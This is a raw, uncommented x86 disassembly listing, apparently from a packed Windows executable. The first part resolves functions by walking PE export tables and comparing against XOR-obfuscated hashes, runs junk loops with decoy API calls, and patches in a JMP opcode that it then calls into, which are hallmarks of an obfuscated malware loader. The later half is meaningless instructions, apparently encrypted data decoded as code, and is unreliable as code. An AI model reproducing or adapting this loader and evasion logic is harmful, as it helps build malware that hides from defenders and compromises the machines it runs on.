  4051e7:	xor    eax,esi
  4051e9:	add    eax,edi
  4051eb:	cmp    ecx,eax
  4051ed:	je     0x4052d3
  4051f3:	push   DWORD PTR [ebp-0x14]
  4051f6:	push   DWORD PTR [ebp+0x8]
  4051f9:	call   0x40ea45
  4051fe:	mov    DWORD PTR [ebp-0x14],eax
  405201:	mov    eax,DWORD PTR [ebp-0x4]
  405204:	mov    ecx,DWORD PTR [ebp-0x14]
  405207:	xor    eax,esi
  405209:	add    eax,edi
  40520b:	cmp    ecx,eax
  40520d:	je     0x4052d3
  405213:	mov    eax,DWORD PTR [ebp-0x14]
  405216:	mov    eax,DWORD PTR [eax+0x18]
  405219:	mov    DWORD PTR [ebp-0x24],eax
  40521c:	mov    eax,DWORD PTR [ebp-0x14]
  40521f:	mov    ecx,DWORD PTR [ebp+0x8]
  405222:	add    ecx,DWORD PTR [eax+0x20]
  405225:	mov    DWORD PTR [ebp-0x2c],ecx
  405228:	mov    eax,DWORD PTR [ebp-0x14]
  40522b:	mov    ecx,DWORD PTR [ebp+0x8]
  40522e:	add    ecx,DWORD PTR [eax+0x24]
  405231:	mov    DWORD PTR [ebp-0x34],ecx
  405234:	mov    eax,DWORD PTR [ebp-0x14]
  405237:	mov    ecx,DWORD PTR [ebp+0x8]
  40523a:	add    ecx,DWORD PTR [eax+0x1c]
  40523d:	mov    DWORD PTR [ebp-0x14],ecx
  405240:	jmp    0x40529b
  405245:	mov    eax,DWORD PTR [ebp-0x2c]
  405248:	mov    ecx,DWORD PTR [ebp+0x8]
  40524b:	add    ecx,DWORD PTR [eax+ebx*4]
  40524e:	mov    DWORD PTR [ebp-0x28],ecx
  405251:	mov    eax,DWORD PTR [ebp-0x4]
  405254:	mov    ecx,DWORD PTR [ebp-0x28]
  405257:	xor    eax,esi
  405259:	add    eax,edi
  40525b:	cmp    ecx,eax
  40525d:	je     0x40529b
  405263:	jmp    0x40528c
  405268:	mov    eax,DWORD PTR [ebp-0x4]
  40526b:	mov    ecx,DWORD PTR [ebp-0x8]
  40526e:	xor    eax,esi
  405270:	add    eax,edi
  405272:	cmp    ecx,eax
  405274:	mov    eax,DWORD PTR [ebp-0x4]
  405277:	je     0x4052d6
  40527d:	mov    ecx,DWORD PTR [ebp-0x30]
  405280:	xor    eax,esi
  405282:	add    eax,edi
  405284:	cmp    ecx,eax
  405286:	je     0x4052df
  40528c:	lea    eax,[ebp-0x8]
  40528f:	push   eax
  405290:	push   DWORD PTR [ebp-0x28]
  405293:	push   DWORD PTR [ebp+0xc]
  405296:	call   0x40eccc
  40529b:	mov    eax,DWORD PTR [ebp-0x4]
  40529e:	mov    ecx,DWORD PTR [ebp-0x8]
  4052a1:	xor    eax,esi
  4052a3:	add    eax,edi
  4052a5:	cmp    ecx,eax
  4052a7:	je     0x4052c2
  4052ad:	mov    eax,DWORD PTR [ebp-0x34]
  4052b0:	movzx  eax,WORD PTR [eax+ebx*2]
  4052b4:	mov    ecx,DWORD PTR [ebp-0x14]
  4052b7:	mov    eax,DWORD PTR [ecx+eax*4]
  4052ba:	mov    DWORD PTR [ebp-0x38],eax
  4052bd:	jmp    0x405268
  4052c2:	mov    eax,DWORD PTR [ebp-0xc]
  4052c5:	xor    eax,esi
  4052c7:	lea    ebx,[ebx+eax*1+0x3272e2]
  4052ce:	jmp    0x404fb8
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x4053fc
  4052df:	mov    eax,DWORD PTR [ebp-0x38]
  4052e2:	add    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    DWORD PTR [ebp-0x18],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052eb:	test   eax,eax
  4052ed:	je     0x405387
  4052f3:	mov    DWORD PTR [ebp-0x20],0x0
  4052fa:	push   0x3
  4052fc:	xor    edx,edx
  4052fe:	pop    edx
  4052ff:	add    edx,0x8
  405302:	push   edx
  405303:	pop    ecx
  405304:	push   0x6
  405306:	dec    ecx
  405307:	pop    ebx
  405308:	dec    ebx
  405309:	xchg   ebx,ecx
  40530b:	sub    ebx,ecx
  40530d:	xchg   ebx,ecx
  40530f:	dec    ecx
  405310:	mov    eax,DWORD PTR [ebp-0x1c]
  405313:	imul   eax,ecx
  405316:	sub    esp,eax
  405318:	mov    DWORD PTR [ebp-0x20],esp
  40531b:	mov    eax,DWORD PTR [ebp-0x4]
  40531e:	xor    eax,esi
  405320:	add    eax,edi
  405322:	jmp    0x405360
  405327:	mov    ecx,DWORD PTR [ebp-0xc]
  40532a:	mov    eax,DWORD PTR [ebp+0x8]
  40532d:	mov    edx,DWORD PTR [ebp+0x14]
  405330:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  405334:	xor    ecx,esi
  405336:	add    ecx,edi
  405338:	xor    edx,edx
  40533a:	div    ecx
  40533c:	mov    ecx,DWORD PTR [ebp-0x4]
  40533f:	xor    ecx,esi
  405341:	lea    eax,[ecx+eax*1+0x3272e2]
  405348:	mov    ecx,DWORD PTR [ebp+0x8]
  40534b:	mov    edx,DWORD PTR [ebp-0x20]
  40534e:	mov    DWORD PTR [edx+ecx*4],eax
  405351:	mov    eax,DWORD PTR [ebp-0xc]
  405354:	mov    ecx,DWORD PTR [ebp+0x8]
  405357:	xor    eax,esi
  405359:	lea    eax,[eax+ecx*1+0x3272e2]
  405360:	mov    DWORD PTR [ebp+0x8],eax
  405363:	mov    eax,DWORD PTR [ebp-0xc]
  405366:	mov    ecx,DWORD PTR [ebp+0x14]
  405369:	xor    eax,esi
  40536b:	add    eax,edi
  40536d:	imul   eax,DWORD PTR [ecx]
  405370:	mov    ecx,DWORD PTR [ebp-0x4]
  405373:	mov    edx,DWORD PTR [ebp+0x8]
  405376:	xor    ecx,esi
  405378:	lea    ecx,[ecx+edx*1+0x3272e2]
  40537f:	cmp    ecx,eax
  405381:	jne    0x405327
  405387:	mov    eax,DWORD PTR [ebp-0x4]
  40538a:	xor    eax,esi
  40538c:	add    eax,edi
  40538e:	mov    DWORD PTR [ebp-0x10],eax
  405391:	mov    ebx,0x65655
  405396:	add    ebx,0x3234
  40539c:	xchg   ebx,esi
  40539e:	xor    ebx,ebx
  4053a0:	push   esi
  4053a1:	mov    esi,ebx
  4053a3:	pop    ebx
  4053a4:	mov    edx,esi
  4053a6:	add    ebx,0x1002
  4053ac:	lea    eax,[ebp-0x18]
  4053af:	add    edx,eax
  4053b1:	add    edx,0x5
  4053b4:	push   edx
  4053b5:	inc    esi
  4053b6:	pop    ecx
  4053b7:	dec    ecx
  4053b8:	xchg   ecx,eax
  4053b9:	dec    eax
  4053ba:	xchg   ecx,eax
  4053bb:	dec    ecx
  4053bc:	xchg   ecx,edx
  4053be:	dec    edx
  4053bf:	push   edx
  4053c0:	mov    edx,ebx
  4053c2:	pop    ebx
  4053c3:	dec    ebx
  4053c4:	call   DWORD PTR [ebx]
  4053c6:	cmp    DWORD PTR [ebp+0x10],esi
  4053c9:	je     0x4053e8
  4053cf:	xchg   edx,eax
  4053d0:	push   0xb
  4053d2:	pop    ecx
  4053d3:	push   0x4
  4053d5:	pop    ebx
  4053d6:	inc    ebx
  4053d7:	xchg   ebx,ecx
  4053d9:	sub    ebx,ecx
  4053db:	xchg   ebx,ecx
  4053dd:	dec    ecx
  4053de:	dec    ecx
  4053df:	mov    eax,DWORD PTR [ebp-0x1c]
  4053e2:	imul   eax,ecx
  4053e5:	add    esp,eax
  4053e7:	xchg   edx,eax
  4053e8:	push   eax
  4053e9:	xor    ebx,ebx
  4053eb:	mov    edx,esp
  4053ed:	dec    edx
  4053ee:	inc    ebx
  4053ef:	add    ebx,DWORD PTR [edx+ebx*1]
  4053f2:	dec    ebx
  4053f3:	xor    edx,edx
  4053f5:	add    DWORD PTR [ebp-0x10],ebx
  4053f8:	pop    ebx
  4053f9:	mov    eax,DWORD PTR [ebp-0x10]
  4053fc:	pop    edi
  4053fd:	pop    esi
  4053fe:	pop    ebx
  4053ff:	leave  
  405400:	ret    0x10
  405403:	push   ebp
  405404:	mov    ebp,esp
  405406:	sub    esp,0x7c
  405409:	mov    DWORD PTR ds:0x42c018,0x17
  405413:	cmp    DWORD PTR ds:0x42c018,0x0
  40541a:	je     0x40544a
  405420:	cmp    DWORD PTR ds:0x42c018,0x20
  405427:	jne    0x405438
  40542d:	push   0x8a80
  405432:	call   DWORD PTR ds:0x42e8cb
  405438:	mov    eax,ds:0x42c018
  40543d:	dec    eax
  40543e:	mov    ds:0x42c018,eax
  405443:	jmp    0x405413
  405448:	adc    eax,ecx
  40544a:	push   esi
  40544b:	sub    esi,0x3b9
  405451:	push   edi
  405452:	mov    edi,DWORD PTR ds:0x41ce18
  405458:	mov    eax,ds:0x41cd89
  40545d:	sub    edi,eax
  40545f:	add    edi,DWORD PTR [edi+eax*1]
  405462:	mov    eax,ds:0x42e2b7
  405467:	and    DWORD PTR ds:0x42b018,0x0
  405471:	jmp    0x405483
  405476:	mov    ecx,DWORD PTR ds:0x42b018
  40547c:	inc    ecx
  40547d:	mov    DWORD PTR ds:0x42b018,ecx
  405483:	cmp    DWORD PTR ds:0x42b018,0x10
  40548a:	jae    0x4054d5
  405490:	cmp    DWORD PTR ds:0x42b018,0x5
  405497:	jne    0x4054b3
  40549d:	push   0x429020
  4054a2:	push   DWORD PTR [ebp-0x20]
  4054a5:	push   DWORD PTR [ebp-0x20]
  4054a8:	push   0x7ab5
  4054ad:	call   DWORD PTR ds:0x42e8cf
  4054b3:	cmp    DWORD PTR ds:0x42b018,0x4
  4054ba:	jne    0x4054cf
  4054c0:	xor    ecx,ecx
  4054c2:	or     ecx,DWORD PTR ds:0x42b018
  4054c8:	inc    ecx
  4054c9:	mov    DWORD PTR ds:0x42b018,ecx
  4054cf:	jmp    0x405476
  4054d4:	dec    edi
  4054d5:	mov    DWORD PTR [ebp-0x24],eax
  4054d8:	sbb    eax,DWORD PTR ds:0x42d000
  4054de:	mov    eax,ds:0x42e3c3
  4054e3:	mov    DWORD PTR [ebp-0x34],eax
  4054e6:	mov    DWORD PTR ds:0x42c014,0x14
  4054f0:	cmp    DWORD PTR ds:0x42c014,0x0
  4054f7:	je     0x405540
  4054fd:	cmp    DWORD PTR ds:0x42c014,0x2
  405504:	jne    0x405515
  40550a:	push   0x6dea
  40550f:	call   DWORD PTR ds:0x42e913
  405515:	cmp    DWORD PTR ds:0x42c014,0x3
  40551c:	jne    0x405530
  405522:	xor    eax,eax
  405524:	xor    eax,DWORD PTR ds:0x42c014
  40552a:	dec    eax
  40552b:	mov    ds:0x42c014,eax
  405530:	mov    eax,ds:0x42c014
  405535:	dec    eax
  405536:	mov    ds:0x42c014,eax
  40553b:	jmp    0x4054f0
  405540:	and    DWORD PTR [ebp-0x30],0x0
  405544:	mov    eax,ds:0x41cd9d
  405549:	mov    eax,DWORD PTR [eax]
  40554b:	adc    DWORD PTR ds:0x42c010,eax
  405551:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  405558:	add    edi,edi
  40555a:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405561:	mov    eax,DWORD PTR [ebp-0x10]
  405564:	mov    ecx,DWORD PTR [ebp-0x10]
  405567:	and    DWORD PTR ds:0x42c000,0x0
  405571:	jmp    0x405583
  405576:	mov    edi,DWORD PTR ds:0x42c000
  40557c:	inc    edi
  40557d:	mov    DWORD PTR ds:0x42c000,edi
  405583:	cmp    DWORD PTR ds:0x42c000,0x19
  40558a:	jae    0x4055bb
  405590:	cmp    DWORD PTR ds:0x42c000,0x1c
  405597:	jne    0x4055b0
  40559d:	push   DWORD PTR [ebp-0x20]
  4055a0:	push   0x5aa1
  4055a5:	push   0x4e93
  4055aa:	call   DWORD PTR ds:0x42e8d3
  4055b0:	jmp    0x405576
  4055b5:	and    esi,DWORD PTR ds:0x42b004
  4055bb:	sub    eax,ecx
  4055bd:	adc    DWORD PTR ds:0x42c014,ecx
  4055c3:	mov    DWORD PTR [ebp-0x10],eax
  4055c6:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  4055cd:	sbb    esi,ecx
  4055cf:	mov    eax,DWORD PTR [ebp-0x18]
  4055d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4055d5:	or     DWORD PTR ds:0x42a00c,ecx
  4055db:	sub    eax,ecx
  4055dd:	mov    DWORD PTR [ebp-0x18],eax
  4055e0:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4055e7:	add    esi,DWORD PTR ds:0x42b018
  4055ed:	mov    eax,DWORD PTR [ebp-0xc]
  4055f0:	xor    edi,edi
  4055f2:	xor    edi,DWORD PTR ds:0x41cdd8
  4055f8:	mov    esi,DWORD PTR ds:0x41ce34
  4055fe:	sub    esi,edi
  405600:	imul   edi,DWORD PTR [edi+esi*1]
  405604:	mov    ecx,DWORD PTR [ebp-0xc]
  405607:	mov    DWORD PTR ds:0x429020,0x15
  405611:	cmp    DWORD PTR ds:0x429020,0x0
  405618:	je     0x40566c
  40561e:	cmp    DWORD PTR ds:0x429020,0xb
  405625:	jne    0x40563e
  40562b:	push   DWORD PTR [ebp-0x24]
  40562e:	push   0x42e000
  405633:	push   0x429018
  405638:	call   DWORD PTR ds:0x42e917
  40563e:	cmp    DWORD PTR ds:0x429020,0xc
  405645:	jne    0x40565a
  40564b:	xor    esi,esi
  40564d:	or     esi,DWORD PTR ds:0x429020
  405653:	dec    esi
  405654:	mov    DWORD PTR ds:0x429020,esi
  40565a:	mov    esi,DWORD PTR ds:0x429020
  405660:	dec    esi
  405661:	mov    DWORD PTR ds:0x429020,esi
  405667:	jmp    0x405611
  40566c:	sub    eax,ecx
  40566e:	mov    DWORD PTR [ebp-0xc],eax
  405671:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  405678:	mov    eax,DWORD PTR [ebp-0x1c]
  40567b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40567e:	sub    eax,ecx
  405680:	mov    DWORD PTR [ebp-0x1c],eax
  405683:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  40568a:	mov    eax,DWORD PTR [ebp-0x20]
  40568d:	mov    ecx,DWORD PTR [ebp-0x20]
  405690:	sub    eax,ecx
  405692:	mov    DWORD PTR [ebp-0x20],eax
  405695:	mov    eax,DWORD PTR [ebp-0x2c]
  405698:	mov    ecx,DWORD PTR [ebp-0x20]
  40569b:	mov    esi,0x751089b
  4056a0:	xor    eax,esi
  4056a2:	mov    edi,0x3272e2
  4056a7:	add    eax,edi
  4056a9:	or     eax,ecx
  4056ab:	mov    DWORD PTR [ebp-0x20],eax
  4056ae:	mov    eax,DWORD PTR [ebp-0x4]
  4056b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4056b4:	sub    eax,ecx
  4056b6:	mov    DWORD PTR [ebp-0x4],eax
  4056b9:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  4056c0:	mov    eax,DWORD PTR [ebp-0xc]
  4056c3:	xor    eax,esi
  4056c5:	add    eax,edi
  4056c7:	push   eax
  4056c8:	mov    eax,DWORD PTR [ebp-0x10]
  4056cb:	xor    eax,esi
  4056cd:	add    eax,edi
  4056cf:	push   eax
  4056d0:	mov    eax,DWORD PTR [ebp-0x4]
  4056d3:	xor    eax,esi
  4056d5:	add    eax,edi
  4056d7:	push   eax
  4056d8:	lea    eax,[ebp-0x7c]
  4056db:	push   eax
  4056dc:	push   DWORD PTR [ebp-0x2c]
  4056df:	push   DWORD PTR [ebp-0x28]
  4056e2:	call   0x40ebe9
  4056e7:	test   eax,eax
  4056e9:	je     0x405717
  4056ef:	lea    eax,[ebp-0x7c]
  4056f2:	push   eax
  4056f3:	mov    eax,DWORD PTR [ebp-0x28]
  4056f6:	xor    eax,esi
  4056f8:	add    eax,edi
  4056fa:	push   eax
  4056fb:	mov    eax,DWORD PTR [ebp-0x24]
  4056fe:	add    eax,0xaa
  405703:	push   eax
  405704:	mov    eax,DWORD PTR [ebp-0x24]
  405707:	mov    eax,DWORD PTR [eax+0x198]
  40570d:	push   DWORD PTR [eax]
  40570f:	call   0x40294c
  405714:	mov    DWORD PTR [ebp-0x14],eax
  405717:	lea    eax,[ebp+0x4]
  40571a:	mov    DWORD PTR [ebp-0x30],eax
  40571d:	mov    eax,DWORD PTR [ebp-0x14]
  405720:	test   eax,eax
  405722:	je     0x40578a
  405728:	lea    eax,[ebp-0x8]
  40572b:	mov    DWORD PTR [ebp-0x38],eax
  40572e:	mov    eax,DWORD PTR [ebp-0x34]
  405731:	mov    DWORD PTR [ebp-0x8],eax
  405734:	mov    eax,DWORD PTR [ebp-0x8]
  405737:	mov    ecx,DWORD PTR [ebp-0x14]
  40573a:	sub    eax,ecx
  40573c:	mov    DWORD PTR [ebp-0x8],eax
  40573f:	mov    ecx,DWORD PTR [ebp-0x4]
  405742:	xor    ecx,esi
  405744:	mov    eax,0xffcd8d1e
  405749:	sub    eax,ecx
  40574b:	add    DWORD PTR [ebp-0x8],eax
  40574e:	mov    eax,DWORD PTR [ebp-0x8]
  405751:	mov    ecx,DWORD PTR [ebp-0x14]
  405754:	mov    DWORD PTR [ecx+0x1],eax
  405757:	mov    eax,DWORD PTR [ebp-0x14]
  40575a:	push   DWORD PTR [ebp-0x24]
  40575d:	mov    BYTE PTR [eax],0xe9
  405760:	mov    eax,ds:0x42e133
  405765:	push   DWORD PTR [eax]
  405767:	push   DWORD PTR ds:0x42e38f
  40576d:	push   DWORD PTR ds:0x42e13b
  405773:	push   DWORD PTR ds:0x42e36f
  405779:	push   DWORD PTR ds:0x42e683
  40577f:	push   DWORD PTR [ebp-0x28]
  405782:	push   DWORD PTR [ebp-0x2c]
  405785:	mov    eax,DWORD PTR [ebp-0x14]
  405788:	call   eax
  40578a:	mov    eax,DWORD PTR [ebp-0x30]
  40578d:	mov    ecx,DWORD PTR ds:0x42e333
  405793:	add    DWORD PTR [eax],ecx
  405795:	pop    edi
  405796:	pop    esi
  405797:	leave  
  405798:	ret    
  405799:	push   ebp
  40579a:	mov    ebp,esp
  40579c:	sub    esp,0x18
  40579f:	mov    DWORD PTR ds:0x429014,0x19
  4057a9:	cmp    DWORD PTR ds:0x429014,0x0
  4057b0:	je     0x405814
  4057b6:	cmp    DWORD PTR ds:0x429014,0xd
  4057bd:	jne    0x4057d5
  4057c3:	push   DWORD PTR [ebp-0x20]
  4057c6:	push   DWORD PTR [ebp-0x24]
  4057c9:	push   DWORD PTR [ebp-0x24]
  4057cc:	push   DWORD PTR [ebp-0x28]
  4057cf:	call   DWORD PTR ds:0x42e8d7
  4057d5:	cmp    DWORD PTR ds:0x429014,0xe
  4057dc:	jne    0x4057f1
  4057e2:	xor    edx,edx
  4057e4:	xor    edx,DWORD PTR ds:0x429014
  4057ea:	dec    edx
  4057eb:	mov    DWORD PTR ds:0x429014,edx
  4057f1:	mov    edx,DWORD PTR ds:0x429014
  4057f7:	dec    edx
  4057f8:	mov    DWORD PTR ds:0x429014,edx
  4057fe:	jmp    0x4057a9
  405803:	mov    ecx,DWORD PTR ds:0x41cd6d
  405809:	mov    edx,DWORD PTR ds:0x41cd85
  40580f:	sub    edx,ecx
  405811:	and    ecx,DWORD PTR [ecx+edx*1]
  405814:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  40581b:	sub    DWORD PTR ds:0x42d00c,0x7538
  405825:	lea    eax,[ebp+0x14]
  405828:	mov    DWORD PTR [ebp-0x4],eax
  40582b:	movzx  edx,WORD PTR ds:0x42b014
  405832:	sbb    DWORD PTR ds:0x42d01c,edx
  405838:	push   esi
  405839:	mov    esi,0xf89c8585
  40583e:	mov    edx,DWORD PTR ds:0x42d008
  405844:	and    DWORD PTR ds:0x42c010,edx
  40584a:	mov    DWORD PTR [ebp-0xc],esi
  40584d:	sbb    DWORD PTR ds:0x42900c,0x3284
  405857:	lea    eax,[ebp-0xc]
  40585a:	add    DWORD PTR ds:0x429024,0x6cdb
  405864:	mov    DWORD PTR [ebp-0x14],eax
  405867:	neg    eax
  405869:	mov    eax,DWORD PTR [ebp-0xc]
  40586c:	sbb    ecx,0x367b
  405872:	mov    edx,DWORD PTR [ebp-0x14]
  405875:	mov    ecx,0x751089b
  40587a:	sbb    DWORD PTR ds:0x42900c,0x429014
  405884:	xor    eax,ecx
  405886:	and    DWORD PTR ds:0x429014,0x429028
  405890:	add    eax,0x3272e2
  405895:	mov    DWORD PTR [edx],eax
  405897:	adc    edx,DWORD PTR ds:0x42d014
  40589d:	mov    eax,ds:0x42e12f
  4058a2:	adc    edx,DWORD PTR ds:0x42d008
  4058a8:	mov    edx,DWORD PTR [ebp-0x4]
  4058ab:	mov    eax,DWORD PTR [eax]
  4058ad:	xor    DWORD PTR ds:0x42b000,0x42a008
  4058b7:	add    eax,DWORD PTR [edx]
  4058b9:	push   edi
  4058ba:	and    edx,DWORD PTR ds:0x42a00c
  4058c0:	mov    DWORD PTR [ebp-0x8],eax
  4058c3:	movzx  eax,WORD PTR ds:0x42b000
  4058ca:	sub    DWORD PTR ds:0x42a010,eax
  4058d0:	mov    edi,DWORD PTR [ebp+0x8]
  4058d3:	xor    DWORD PTR ds:0x429018,0x6981
  4058dd:	jmp    0x407c2c
  4058e2:	mov    dh,0x31
  4058e4:	mov    ecx,0xb277bb1f
  4058e9:	jno    0x405908
  4058eb:	push   edi
  4058ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ed:	xor    DWORD PTR [ebx+0x75],ecx
  4058f0:	pop    ebx
  4058f1:	out    dx,al
  4058f2:	xor    al,0x5f
  4058f4:	jl     0x405972
  4058f6:	dec    esi
  4058f7:	pop    edi
  4058f8:	jl     0x405976
  4058fa:	nop
  4058fb:	ror    DWORD PTR [edx+0x709df861],0xbd
  405902:	ret    
  405903:	jo     0x40588c
  405905:	leave  
  405906:	shl    DWORD PTR [ecx-0x27],cl
  405909:	in     al,0x33
  40590b:	adc    al,0xc4
  40590d:	repnz fisub DWORD PTR [edi]
  405910:	popf   
  405911:	pushf  
  405912:	idiv   BYTE PTR [eax+0x2]
  405915:	mov    ah,0x1c
  405917:	pushf  
  405918:	clc    
  405919:	or     al,0x6c
  40591b:	imul   esp,DWORD PTR [eax],0xffffffef
  40591e:	repnz gs cwde 
  405921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405922:	mov    bl,0x94
  405924:	inc    esp
  405925:	xchg   DWORD PTR ss:[edx],esi
  405928:	and    eax,0xf8797404
  40592d:	sub    DWORD PTR [ebp-0x337c7fff],edx
  405933:	push   esp
  405934:	jne    0x4058b6
  405936:	push   eax
  405937:	push   ds
  405938:	aam    0x21
  40593a:	jge    0x405992
  40593c:	fist   DWORD PTR [edx]
  40593e:	inc    ecx
  40593f:	or     ah,BYTE PTR [ecx+0x497225a0]
  405945:	aad    0x59
  405947:	(bad)  
  405949:	outs   dx,BYTE PTR ds:[esi]
  40594a:	xor    ebp,ecx
  40594c:	data16 and al,0xf3
  40594f:	cli    
  405950:	(bad)
  405953:	mov    eax,0x13488301
  405958:	scas   al,BYTE PTR es:[edi]
  405959:	das    
  40595a:	adc    ebx,DWORD PTR [edx+0x71d47c73]
  405960:	fwait
  405961:	xlat   BYTE PTR ds:[ebx]
  405962:	mov    esp,0xcad5d84d
  405967:	rcl    DWORD PTR [esi-0x183b1055],cl
  40596d:	or     al,BYTE PTR [esp+ebx*2-0x2cd45242]
  405974:	dec    edx
  405975:	push   0xf167b72b
  40597a:	pop    ss
  40597b:	sti    
  40597c:	adc    BYTE PTR [ecx],ah
  40597e:	jg     0x40591d
  405980:	xor    DWORD PTR [ebp-0x6b0d2ee4],ebp
  405986:	pop    esp
  405987:	or     ch,BYTE PTR [edx+0x7]
  40598a:	jae    0x405994
  40598c:	add    cl,0xc6
  40598f:	push   DWORD PTR [esi-0x5a]
  405992:	xchg   bh,al
  405994:	in     al,dx
  405995:	(bad)
  405998:	lods   eax,DWORD PTR ds:[esi]
  405999:	inc    ecx
  40599a:	call   0x2404540b
  40599f:	cmp    ecx,DWORD PTR [eax-0x21ba053]
  4059a5:	sub    ebx,DWORD PTR [ebx]
  4059a7:	lock (bad) 
  4059a9:	int3   
  4059aa:	or     DWORD PTR [esi],edx
  4059ac:	pop    edx
  4059ad:	xchg   ebx,eax
  4059ae:	cld    
  4059af:	dec    eax
  4059b0:	(bad)  
  4059b1:	test   BYTE PTR [ebx-0x45b1771b],0x1b
  4059b8:	shr    BYTE PTR [ebx+0x2eecea56],1
  4059be:	ja     0x405a1e
  4059c0:	es pop esi
  4059c2:	pop    esi
  4059c3:	in     eax,dx
  4059c4:	mov    ebp,0xa72ce3ea
  4059c9:	cmp    al,0x49
  4059cb:	mov    al,0x2e
  4059cd:	sbb    dl,cl
  4059cf:	inc    esi
  4059d0:	lahf   
  4059d1:	and    DWORD PTR [eax+0x3f2fd925],esi
  4059d7:	mov    bh,0x73
  4059d9:	mov    bh,dh
  4059db:	fst    QWORD PTR [edi+edi*4-0x55dea40e]
  4059e2:	loop   0x4059a0
  4059e4:	adc    al,0xf6
  4059e7:	inc    ebx
  4059e8:	popf   
  4059e9:	in     al,0x64
  4059eb:	push   es
  4059ec:	inc    ecx
  4059ed:	(bad)  
  4059ee:	cmp    esi,esp
  4059f0:	xlat   BYTE PTR ds:[ebx]
  4059f1:	mov    cl,0xcc
  4059f3:	out    dx,eax
  4059f4:	les    ebx,FWORD PTR [edi]
  4059f6:	mov    DWORD PTR [edi],esi
  4059f8:	push   0xffffffba
  4059fa:	pop    ds
  4059fb:	push   edx
  4059fc:	js     0x4059cf
  4059fe:	out    0x18,al
  405a00:	std    
  405a01:	int    0x9d
  405a03:	push   0xffffff8e
  405a05:	adc    eax,0x8484f255
  405a0a:	push   ds
  405a0b:	sub    DWORD PTR [ebx+0x7452b6d],0xaee1e26b
  405a15:	add    DWORD PTR [ecx-0x19],ebp
  405a18:	aad    0x8f
  405a1a:	mov    bl,0xcb
  405a1c:	inc    ecx
  405a1d:	leave  
  405a1e:	push   edx
  405a1f:	pop    ecx
  405a20:	adc    al,0x3c
  405a22:	dec    ebp
  405a23:	jne    0x4059ba
  405a25:	stc    
  405a26:	std    
  405a27:	xor    bl,BYTE PTR [ebx]
  405a29:	pop    ds
  405a2a:	call   0x2da7:0x51acefef
  405a31:	adc    ch,cl
  405a33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a34:	popf   
  405a35:	or     edx,edi
  405a37:	mov    esi,0x90dc340a
  405a3c:	cmp    bl,bl
  405a3e:	pop    ebp
  405a3f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a41:	imul   eax,DWORD PTR [ecx-0x15],0x9
  405a45:	shl    BYTE PTR [ecx+eax*8+0x66],0x96
  405a4a:	jo     0x405aa7
  405a4c:	pop    ebx
  405a4d:	push   esi
  405a4e:	xchg   ecx,eax
  405a4f:	int3   
  405a50:	xchg   DWORD PTR ds:0xfcf08f4c,eax
  405a56:	cmp    eax,0x5826d8cd
  405a5b:	mov    ah,0x7e
  405a5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a5e:	shl    DWORD PTR [ebx+0x37f51cc2],1
  405a64:	fadd   st,st(6)
  405a66:	jae    0x405ad5
  405a68:	cmc    
  405a69:	mov    edi,0x80c84020
  405a6e:	scas   al,BYTE PTR es:[edi]
  405a6f:	sbb    dl,BYTE PTR [esi+esi*1+0x7cc901cd]
  405a76:	pop    esp
  405a77:	dec    edi
  405a78:	push   esi
  405a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a7a:	xor    BYTE PTR [esi-0x2b],bl
  405a7d:	mov    esi,0xc10ddb3b
  405a82:	and    BYTE PTR [ebx-0xf],ah
  405a85:	sti    
  405a86:	inc    edx
  405a87:	out    0x8,al
  405a89:	xchg   esp,eax
  405a8a:	pop    es
  405a8b:	out    0x97,eax
  405a8d:	and    al,0xb1
  405a8f:	xor    eax,0x165617b9
  405a94:	imul   ecx,ebp,0x7c72b746
  405a9a:	sbb    al,0xcd
  405a9c:	dec    edi
  405a9d:	loopne 0x405af4
  405a9f:	mov    ss,edx
  405aa1:	xchg   ebx,eax
  405aa2:	push   es
  405aa3:	jl     0x405ac0
  405aa5:	push   ds
  405aa6:	ja     0x405a67
  405aa8:	push   esp
  405aa9:	setae  dh
  405aac:	inc    al
  405aae:	sub    bl,BYTE PTR [ecx]
  405ab0:	xor    BYTE PTR [edx-0x43],bl
  405ab3:	ds push 0x43
  405ab6:	xchg   ebp,eax
  405ab7:	adc    DWORD PTR [esi-0x2d695cd4],ebp
  405abd:	pop    DWORD PTR fs:[ecx]
  405ac0:	mov    bh,0x49
  405ac2:	mov    ebp,0x8ea52ef0
  405ac7:	cmp    edi,DWORD PTR [edx-0x16]
  405aca:	sbb    al,0x4e
  405acc:	add    bh,BYTE PTR [ecx]
  405ace:	cmp    edi,0xffffffc4
  405ad1:	test   al,0x84
  405ad3:	hlt    
  405ad4:	test   eax,0x31b2fc1e
  405ad9:	stos   DWORD PTR es:[edi],eax
  405ada:	dec    esp
  405adb:	in     al,0x5c
  405add:	and    al,0x5c
  405adf:	pop    edi
  405ae0:	mov    al,0x22
  405ae2:	adc    ah,BYTE PTR [ecx+0x6d]
  405ae5:	clc    
  405ae6:	and    DWORD PTR [edx+0x71],esi
  405ae9:	sub    al,0x7e
  405aeb:	mov    esp,0xee50fd90
  405af0:	or     al,0x1a
  405af2:	xchg   edi,eax
  405af3:	clc    
  405af4:	mov    bh,0x3a
  405af6:	or     BYTE PTR [edi-0x1a43b93b],cl
  405afc:	cld    
  405afd:	cmp    eax,0xced5e1c
  405b02:	bnd jbe 0x405ada
  405b05:	mov    bl,0xea
  405b07:	retf   
  405b08:	dec    ebx
  405b09:	push   0x22
